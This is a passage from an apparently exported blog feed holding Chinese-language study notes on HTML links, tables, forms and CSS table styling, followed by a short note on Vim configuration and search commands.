style="text-align:center">上一级窗口打开</td></tr><tr><td style="text-align:center">_top</td><td style="text-align:center">在浏览器整个窗口打开</td></tr><tr><td style="text-align:center">框架名称</td><td style="text-align:center">指定浮动框架窗口打开</td></tr></tbody></table></div><h3 id="基准URL"><a href="#基准URL" class="headerlink" title="基准URL"></a>基准URL</h3><p>路径前共同部分<br>可以使用基准URL+相对路径的形式</p><p>基本语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;..&quot; target=&quot;..&quot; /&gt;</span><br></pre></td></tr></table></figure></p><h3 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h3><p>内部链接</p><p>外部链接</p><div class="table-container"><table><thead><tr><th style="text-align:center">URL格式</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">http://</td><td style="text-align:center">万维网</td></tr><tr><td style="text-align:center">mailto:</td><td style="text-align:center">启动邮件发送系统</td></tr><tr><td style="text-align:center">ftp://</td><td style="text-align:center">文件传输服务器</td></tr><tr><td style="text-align:center">telnet://</td><td style="text-align:center">启动远程登录方式</td></tr><tr><td style="text-align:center">news://</td><td style="text-align:center">启动新闻讨论组</td></tr></tbody></table></div><p>书签链接<br>HTML5中用id创建书签<br>创建书签链接<br><code>&lt;a href=&quot;#name&quot;&gt; origin &lt;/a&gt;</code><br><code>&lt;a href=&quot;file_url#name&quot;&gt; origin &lt;/a&gt;</code></p><p>脚本链接</p><p>文件下载链接</p><p>文本链接</p><p>图像链接</p><p>图像映射</p><p>基本语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;img_url&quot; usemap=&quot;#map_name&quot;&gt;</span><br><span class="line">&lt;map name=&quot;map_name&quot;&gt;</span><br><span class="line">    &lt;area shape=&quot;rect&quot; coords=&quot;x1,y1,x2,y2&quot; href=&quot;URL&quot;&gt;</span><br><span class="line">    &lt;area shape=&quot;circle&quot; coords=&quot;x,y,r&quot; href=&quot;URL&quot;&gt;</span><br><span class="line">    &lt;area shape=&quot;poly&quot; coords=&quot;x1,y1,x2,y2,x3,y3,...&quot; href=&quot;URL&quot;&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p><ul><li><map>标签usemap用于激活映射</map></li><li><map>标签定义图像映射中包含热点映射</map></li><li><area>标签用于图像映射中定义一个热区,包含3个必要属性:href,shape,coords</li><li>href属性设置热区链接</li><li>shape设置热区形状</li><li>coords设置热区坐标</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">shape</th><th style="text-align:center">coords</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">rect</td><td style="text-align:center">x1,y1,x2,y2</td><td style="text-align:center">左上 右下</td></tr><tr><td style="text-align:center">circle</td><td style="text-align:center">x,y,r</td><td style="text-align:center">圆心半径</td></tr><tr><td style="text-align:center">poly</td><td style="text-align:center">x1,y1,x2,y2…</td><td style="text-align:center">各个顶点坐标按照单击先后顺序</td></tr></tbody></table></div><h3 id="伪类设置链接样式"><a href="#伪类设置链接样式" class="headerlink" title="伪类设置链接样式"></a>伪类设置链接样式</h3><p>伪类类型<br><code>:link,:visited,:hover,:active</code><br>未访问、访问后、鼠标悬停、活动状态</p><h3 id="链接内联框架"><a href="#链接内联框架" class="headerlink" title="链接内联框架"></a>链接内联框架</h3><p>语法<br><code>&lt;iframe src=&quot;source_url&quot;&gt;...&lt;/iframe&gt;</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">src</td><td style="text-align:center">file_url</td><td style="text-align:center">文档地址</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">px,%</td><td style="text-align:center">高度</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">px,%</td><td style="text-align:center">宽度</td></tr><tr><td style="text-align:center">name</td><td style="text-align:center">frame_name</td><td style="text-align:center">名字</td></tr><tr><td style="text-align:center">frameborder</td><td style="text-align:center">1,0</td><td style="text-align:center">是否显示边框</td></tr><tr><td style="text-align:center">marginheight</td><td style="text-align:center">px</td><td style="text-align:center">顶部底部边距</td></tr><tr><td style="text-align:center">marginwidth</td><td style="text-align:center">px</td><td style="text-align:center">左右边距</td></tr></tbody></table></div><h2 id="网页表格"><a href="#网页表格" class="headerlink" title="网页表格"></a>网页表格</h2><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><div class="table-container"><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;table&gt;</code></td><td style="text-align:center">定义表格</td></tr><tr><td style="text-align:center"><code>&lt;caption&gt;</code></td><td style="text-align:center">定义表格标题</td></tr><tr><td style="text-align:center"><code>&lt;tr&gt;</code></td><td style="text-align:center">定义表格行</td></tr><tr><td style="text-align:center"><code>&lt;th&gt;</code></td><td style="text-align:center">定义表格表头</td></tr><tr><td style="text-align:center"><code>&lt;td&gt;</code></td><td style="text-align:center">定义表格单元格</td></tr><tr><td style="text-align:center"><code>&lt;thead&gt;</code></td><td style="text-align:center">定义表格页眉</td></tr><tr><td style="text-align:center"><code>&lt;tbody&gt;</code></td><td style="text-align:center">定义表格主体</td></tr><tr><td style="text-align:center"><code>&lt;tfoot&gt;</code></td><td style="text-align:center">定义表格页脚</td></tr></tbody></table></div><h3 id="lt-table-gt-标签"><a href="#lt-table-gt-标签" class="headerlink" title="&lt;table&gt;标签"></a><code>&lt;table&gt;</code>标签</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">align</td><td style="text-align:center">left,center,right</td><td style="text-align:center">水平对齐方式,默认左对齐</td></tr><tr><td style="text-align:center">border</td><td style="text-align:center">px</td><td style="text-align:center">边框宽度,默认为0</td></tr><tr><td style="text-align:center">bgcolor</td><td style="text-align:center">#xxxxxx,rgb(x,x,x),colorname</td><td style="text-align:center">背景颜色</td></tr><tr><td style="text-align:center">cellpadding</td><td style="text-align:center">px</td><td style="text-align:center">单元格间距,数据与边框</td></tr><tr><td style="text-align:center">cellspcing</td><td style="text-align:center">px</td><td style="text-align:center">单元格边距,单元格与单元格</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">px,%</td><td style="text-align:center">表格高度</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">px,%</td><td style="text-align:center">表格宽度</td></tr></tbody></table></div><p>注意HTML5中以上属性不再支持，建议使用CSS格式化表格</p><h3 id="lt-tr-gt-标签"><a href="#lt-tr-gt-标签" class="headerlink" title="&lt;tr&gt;标签"></a><code>&lt;tr&gt;</code>标签</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">align</td><td style="text-align:center">left,center,right</td><td style="text-align:center">水平对齐方式,<code>&lt;td&gt;</code>默认左对齐,<code>&lt;th&gt;</code>默认居中对齐</td></tr><tr><td style="text-align:center">bgcolor</td><td style="text-align:center">#xxxxxx,rgb(x,x,x),colorname</td><td style="text-align:center">行背景颜色</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">px,%</td><td style="text-align:center">表格行高度</td></tr><tr><td style="text-align:center">valign</td><td style="text-align:center">baseline,top,middle,bottom</td><td style="text-align:center">垂直对齐方式,默认居中对齐</td></tr></tbody></table></div><h3 id="lt-td-gt-amp-lt-th-gt-标签"><a href="#lt-td-gt-amp-lt-th-gt-标签" class="headerlink" title="&lt;td&gt; &amp; &lt;th&gt;标签"></a><code>&lt;td&gt; &amp; &lt;th&gt;</code>标签</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">align</td><td style="text-align:center">left,center,right</td><td style="text-align:center">水平对齐方式,<code>&lt;td&gt;</code>默认左对齐,<code>&lt;th&gt;</code>默认居中对齐</td></tr><tr><td style="text-align:center">bgcolor</td><td style="text-align:center">#xxxxxx,rgb(x,x,x),colorname</td><td style="text-align:center">背景颜色</td></tr><tr><td style="text-align:center">colspan</td><td style="text-align:center">number</td><td style="text-align:center">单元格横跨列数</td></tr><tr><td style="text-align:center">rowspan</td><td style="text-align:center">number</td><td style="text-align:center">单元格横跨行数</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">px,%</td><td style="text-align:center">单元格高度</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">px,%</td><td style="text-align:center">大暖格宽度</td></tr><tr><td style="text-align:center">valign</td><td style="text-align:center">baseline,top,middle,bottom</td><td style="text-align:center">垂直对齐方式,默认居中对齐</td></tr></tbody></table></div><h3 id="lt-caption-gt-标签"><a href="#lt-caption-gt-标签" class="headerlink" title="&lt;caption&gt;标签"></a><code>&lt;caption&gt;</code>标签</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">align</td><td style="text-align:center">left,center,right</td><td style="text-align:center">设置水平对齐方式,默认center</td></tr><tr><td style="text-align:center">valign</td><td style="text-align:center">top,bottom</td><td style="text-align:center">设置垂直对齐方式,默认top</td></tr></tbody></table></div><h3 id="lt-thead-gt-lt-tbody-gt-lt-tfoot-gt-标签"><a href="#lt-thead-gt-lt-tbody-gt-lt-tfoot-gt-标签" class="headerlink" title="&lt;thead&gt;,&lt;tbody&gt;,&lt;tfoot&gt;标签"></a><code>&lt;thead&gt;,&lt;tbody&gt;,&lt;tfoot&gt;</code>标签</h3><p>分区</p><h3 id="表格标签属性格式化表格"><a href="#表格标签属性格式化表格" class="headerlink" title="表格标签属性格式化表格"></a>表格标签属性格式化表格</h3><h3 id="CSS表格属性"><a href="#CSS表格属性" class="headerlink" title="CSS表格属性"></a>CSS表格属性</h3><p>下面代码不是Markdown语法咯，自己练练HTML表格</p><table border="1" cellspacing="0"><caption>CSS表格属性</caption><thead><tr>    <th>属性</th>    <th>参数</th>    <th>描述</th></tr></thead><tbody><tr>    <th rowspan="2">border-collase</th>    <th>separate</th>    <th>默认值,表格边框和单元格边框会分开</th></tr><tr>    <th>collapse</th>    <th>表格边框和单元格边框会合并为单一边框</th></tr><tr>    <th>border-spacing</th>    <th>length[length]</th>    <th>相邻单元格边框之间距离，单位可取px,cm，定义一个参数则为水平垂直间距，两个参数则为水平和垂直间距</th></tr><tr>    <th rowspan="2">caption-side</th>    <th>top</th>    <th>默认值，标题显示在表格上面</th></tr><tr>    <th>bottom</th>    <th>标题在表格下面</th></tr><tr>    <th rowspan="2">table-layout</th>    <th>automatic</th>    <th>默认值，单元格宽度由内容决定</th></tr><tr>    <th>fixed</th>    <th>单元格宽度由表格宽度和单元格宽度决定</th></tr></tbody></table><h3 id="CSS格式化表格"><a href="#CSS格式化表格" class="headerlink" title="CSS格式化表格"></a>CSS格式化表格</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center">top</td><td style="text-align:center">单元格内容与上边框靠近</td></tr><tr><td style="text-align:center">vertical-align</td><td style="text-align:center">middle</td><td style="text-align:center">默认值,垂直居中</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">bottom</td><td style="text-align:center">与下边框靠近</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">inherit</td><td style="text-align:center">继承父元素</td></tr></tbody></table></div><h3 id="display属性值"><a href="#display属性值" class="headerlink" title="display属性值"></a><code>display</code>属性值</h3><div class="table-container"><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">display属性设置</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;table&gt;</code></td><td style="text-align:center">display:table</td><td style="text-align:center">块级表格，表格前后带换行符</td></tr><tr><td style="text-align:center"><code>&lt;caption&gt;</code></td><td style="text-align:center">display:table-caption</td><td style="text-align:center">表格标题</td></tr><tr><td style="text-align:center"><code>&lt;thead&gt;</code></td><td style="text-align:center">display:table-header-group</td><td style="text-align:center">分组显示</td></tr><tr><td style="text-align:center"><code>&lt;tbody&gt;</code></td><td style="text-align:center">display:table-row-group</td><td style="text-align:center">分组显示</td></tr><tr><td style="text-align:center"><code>&lt;tfoot&gt;</code></td><td style="text-align:center">display:table-footer-group</td><td style="text-align:center">分组显示</td></tr><tr><td style="text-align:center"><code>&lt;tr&gt;</code></td><td style="text-align:center">display:table-row</td><td style="text-align:center">表格行</td></tr><tr><td style="text-align:center"><code>&lt;th&gt;,&lt;td&gt;</code></td><td style="text-align:center">display:table-cell</td><td style="text-align:center">表格单元格</td></tr></tbody></table></div><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><div class="table-container"><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;form&gt;</code></td><td style="text-align:center">定义一个表单区域</td></tr><tr><td style="text-align:center"><code>&lt;input&gt;</code></td><td style="text-align:center">定义输入表单元素</td></tr><tr><td style="text-align:center"><code>&lt;select&gt;</code></td><td style="text-align:center">定义列表元素</td></tr><tr><td style="text-align:center"><code>&lt;option&gt;</code></td><td style="text-align:center">定义列表元素中的项目</td></tr><tr><td style="text-align:center"><code>&lt;textarea&gt;</code></td><td style="text-align:center">定义表单文本域元素</td></tr><tr><td style="text-align:center"><code>&lt;lable&gt;</code></td><td style="text-align:center">定义输入元素标签</td></tr><tr><td style="text-align:center"><code>&lt;button&gt;</code></td><td style="text-align:center">定义按钮</td></tr></tbody></table></div><h3 id="lt-form-gt-标签"><a href="#lt-form-gt-标签" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;</code>标签</h3><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;..&quot; method=&quot;the way of submitting&quot; action=&quot;program&quot;&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">name</td><td style="text-align:center">表单名称</td></tr><tr><td style="text-align:center">method</td><td style="text-align:center">定义表单数据从客户端传送到服务器方法,包括get和post,默认get</td></tr><tr><td style="text-align:center">action</td><td style="text-align:center">用于指定处理表单服务端程序</td></tr><tr><td style="text-align:center">onsubmit</td><td style="text-align:center">用于指定处理表单的脚本函数</td></tr><tr><td style="text-align:center">enctype</td><td style="text-align:center">设置MIME类型，默认值application/x-www-form-urlencoded;需要上传到服务器时应设为multipart/form-data</td></tr><tr><td style="text-align:center">target</td><td style="text-align:center">规定何处打开action URL,包括_black,_self,_parent,_top,_framename</td></tr></tbody></table></div><h3 id="input表单控件"><a href="#input表单控件" class="headerlink" title="input表单控件"></a><code>input</code>表单控件</h3><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;..&quot; name=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">text</td><td style="text-align:center">设置但行文本框元素</td></tr><tr><td style="text-align:center">password</td><td style="text-align:center">设置密码元素</td></tr><tr><td style="text-align:center">file</td><td style="text-align:center">设置文件元素</td></tr><tr><td style="text-align:center">hidden</td><td style="text-align:center">设置隐藏元素</td></tr><tr><td style="text-align:center">radio</td><td style="text-align:center">设置单选框元素</td></tr><tr><td style="text-align:center">checkbox</td><td style="text-align:center">设置复选框元素</td></tr><tr><td style="text-align:center">button</td><td style="text-align:center">设置普通按钮元素</td></tr><tr><td style="text-align:center">submit</td><td style="text-align:center">设置提交按钮元素</td></tr><tr><td style="text-align:center">reset</td><td style="text-align:center">设置重置按钮元素</td></tr></tbody></table></div><h3 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h3><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>文本框其他属性</p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">name</td><td style="text-align:center">设置名称</td></tr><tr><td style="text-align:center">maxlength</td><td style="text-align:center">最多可输入字符数</td></tr><tr><td style="text-align:center">size</td><td style="text-align:center">文本框长度,单位px,默认20px</td></tr><tr><td style="text-align:center">value</td><td style="text-align:center">设置文本框默认值</td></tr></tbody></table></div><h3 id="密码框"><a href="#密码框" class="headerlink" title="密码框"></a>密码框</h3><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;password&quot; name=&quot; &quot;&gt;</span><br></pre></td></tr></table></figure></p><p>和文本框属性相同</p><h3 id="隐藏域"><a href="#隐藏域" class="headerlink" title="隐藏域"></a>隐藏域</h3><p>用于传递实体id的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;..&quot; value=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure></p><h3 id="文件域"><a href="#文件域" class="headerlink" title="文件域"></a>文件域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;file&quot; name=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure><p>将本地文件上传至服务器</p><h3 id="单选框和复选框"><a href="#单选框和复选框" class="headerlink" title="单选框和复选框"></a>单选框和复选框</h3><p>单选框<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;radio&quot; name=&quot;..&quot; value=&quot;..&quot; checked=&quot;checked&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>checked:默认选中或不选中</p><p>复选框<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;..&quot; value=&quot;..&quot; checked=&quot;checked&quot;&gt;</span><br></pre></td></tr></table></figure></p><h3 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; name=&quot;..&quot; value=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="普通按钮"><a href="#普通按钮" class="headerlink" title="普通按钮"></a>普通按钮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;..&quot; onclick=&quot;javascriptfucation&quot; name=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="重置按钮"><a href="#重置按钮" class="headerlink" title="重置按钮"></a>重置按钮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;reset&quot; name=&quot;..&quot; value=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="图像按钮"><a href="#图像按钮" class="headerlink" title="图像按钮"></a>图像按钮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;image&quot; name=&quot;..&quot; src=&quot;..&quot; alt=&quot;..&quot; width=&quot;..&quot; height=&quot;..&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="button元素按钮"><a href="#button元素按钮" class="headerlink" title="button元素按钮"></a>button元素按钮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button type=&quot;submit|button|reset&quot; name=&quot;..&quot; value=&quot;..&quot;&gt; text|images|.. &lt;/button&gt;</span><br></pre></td></tr></table></figure><h3 id="label标签"><a href="#label标签" class="headerlink" title="label标签"></a>label标签</h3><p>可以通过单击标签来进行选择</p><p><code>&lt;label&gt;..&lt;/label&gt;</code></p><p>显式联系<br><code>&lt;label for=&quot;id&quot;&gt;..&lt;label&gt;</code></p><h3 id="选择列表"><a href="#选择列表" class="headerlink" title="选择列表"></a>选择列表</h3><div class="table-container"><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">select</td><td style="text-align:center">name</td><td style="text-align:center">列表名称</td></tr><tr><td style="text-align:center">select</td><td style="text-align:center">size</td><td style="text-align:center">定义同时显示的列表项数,默认为1,取值大于等于1</td></tr><tr><td style="text-align:center">select</td><td style="text-align:center">multiple</td><td style="text-align:center">定义列表选项可多选</td></tr><tr><td style="text-align:center">option</td><td style="text-align:center">value</td><td style="text-align:center">设置选项值</td></tr><tr><td style="text-align:center">option</td><td style="text-align:center">selected</td><td style="text-align:center">设置默认选项</td></tr></tbody></table></div><h3 id="多行文本域"><a href="#多行文本域" class="headerlink" title="多行文本域"></a>多行文本域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea name=&quot;..&quot; rows=&quot;..&quot; cols=&quot;..&quot;&gt;</span><br><span class="line">    ..</span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>令文本域不能扩大缩小 CSS代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">textarea &#123;</span><br><span class="line">    resize:none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="表单元素的disabled-和-readonly属性"><a href="#表单元素的disabled-和-readonly属性" class="headerlink" title="表单元素的disabled 和 readonly属性"></a>表单元素的disabled 和 readonly属性</h3><p>在标签内加上<code>readonly|disable</code>或<code>readonly|disable=true</code><br>readonly可被提交disable不可以</p><h3 id="form-属性"><a href="#form-属性" class="headerlink" title="form 属性"></a>form 属性</h3><p>表明隶属关系不必放在<code>&lt;form&gt;&lt;/form&gt;</code>之间</p><h3 id="formaction-属性"><a href="#formaction-属性" class="headerlink" title="formaction 属性"></a>formaction 属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit|image&quot; formaction=&quot;.jsp&quot;&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; formaction=&quot;.jsp&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="autofocus-属性"><a href="#autofocus-属性" class="headerlink" title="autofocus 属性"></a>autofocus 属性</h3><p>仅有一个设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; autofocus/&gt;</span><br><span class="line">or</span><br><span class="line">&lt;input type=&quot;text&quot; autofocus=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea rows=&quot;&quot; cols=&quot;&quot; autofocus&gt;...&lt;/textarea&gt;</span><br><span class="line">or</span><br><span class="line">&lt;textarea rows=&quot;&quot; cols=&quot;&quot; autofocus=&quot;true&quot;&gt;...&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><h3 id="pattern-属性"><a href="#pattern-属性" class="headerlink" title="pattern 属性"></a>pattern 属性</h3><p>验证属性 正则表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; pattern=&quot;code&quot; title=&quot;error note&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="placeholder-属性"><a href="#placeholder-属性" class="headerlink" title="placeholder 属性"></a>placeholder 属性</h3><p>输入信息提示信息自动消失，清空显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; placeholder=&quot;note&quot;&gt;</span><br><span class="line">&lt;textarea rows=&quot;&quot; cols=&quot;&quot; placeholder=&quot;note&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="required-属性"><a href="#required-属性" class="headerlink" title="required 属性"></a>required 属性</h3><p>判断是否为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;&quot; name=&quot;...&quot; required&gt;</span><br><span class="line">or</span><br><span class="line">&lt;input type=&quot;&quot; name=&quot;...&quot; required=&quot;true&quot;&gt;</span><br></pre></td></tr></table></figure><p>textarea select也可设置该属性</p><h3 id="outline-轮廓线"><a href="#outline-轮廓线" class="headerlink" title="outline 轮廓线"></a>outline 轮廓线</h3><table><thead><tr>    <th>属性</th>    <th>参数</th>    <th>描述</th></tr></thead><tbody><tr>    <th rowspan="3">outline</th>    <th>声明同时设置各属性，之间空一格:outline-color outline-style outline-width</th>    <th rowspan="3">简写属性</th></tr><tr>    <th>none</th></tr><tr>    <th>inherit</th></tr><tr>    <th>outline-color</th>    <th>同border-color</th>    <th>设置轮廓线颜色，当outline-style不为none才有效，默认transparent</th></tr><tr>    <th>outline-style</th>    <th>同border-style</th>    <th>轮廓风格，默认为none</th></tr><tr>    <th>outline-width</th>    <th>同border-width</th>    <th>轮廓线宽度，默认为medium，outline-style不为none时有效</th></tr></tbody></table><h3 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h3><h2 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h2><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《前端HTML+CSS修炼之道》</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim笔记</title>
      <link href="/blog/note-vim/"/>
      <url>/blog/note-vim/</url>
      
        <content type="html"><![CDATA[<h3 id="修改vi-vim配置"><a href="#修改vi-vim配置" class="headerlink" title="修改vi/vim配置"></a>修改vi/vim配置</h3><p>永久修改vi/vim配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.vimrc</span><br></pre></td></tr></table></figure><h3 id="编辑器设置"><a href="#编辑器设置" class="headerlink" title="编辑器设置"></a>编辑器设置</h3><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">:set number</td><td style="text-align:center">显示行号</td></tr><tr><td style="text-align:center">:set nonumber</td><td style="text-align:center">不显示行号</td></tr><tr><td style="text-align:center">:set tabstop</td><td style="text-align:center">设置制表符长度</td></tr><tr><td style="text-align:center">:set ruler</td><td style="text-align:center">显示标尺</td></tr><tr><td style="text-align:center">:set wrap</td><td style="text-align:center">自动折行</td></tr><tr><td style="text-align:center">:set nowrap</td><td style="text-align:center">不自动折行</td></tr><tr><td style="text-align:center">:set autoindent</td><td style="text-align:center">首行缩进</td></tr><tr><td style="text-align:center">:set ignorecase</td><td style="text-align:center">关闭大小写敏感</td></tr><tr><td style="text-align:center">:set nomagic</td><td style="text-align:center">关闭特殊字符’*’’?’等</td></tr><tr><td style="text-align:center">:set showmode</td><td style="text-align:center">显示模式</td></tr><tr><td style="text-align:center">:set showmatch</td><td style="text-align:center">显示匹配的括号</td></tr><tr><td style="text-align:center">:set wrapscan</td><td style="text-align:center">文本循环</td></tr></tbody></table></div><h3 id="find-string"><a href="#find-string" class="headerlink" title="find string"></a>find string</h3><p><code>/string</code></p><p>从上往下搜索</p><p><code>?string</code></p><p>从下往上搜索</p><p>可用正则表达式</p><h3 id="ab-Command"><a href="#ab-Command" class="headerlink" title="ab Command"></a>ab Command</h3><p>设置缩写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:ab &lt;string1&gt; &lt;string2&gt;</span><br></pre></td></tr></table></figure><p>string1代表string2</p><h3 id="map-Command"><a href="#map-Command" class="headerlink" title="map Command"></a>map Command</h3>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AddBall</title>
      <link href="/blog/js-addball/"/>
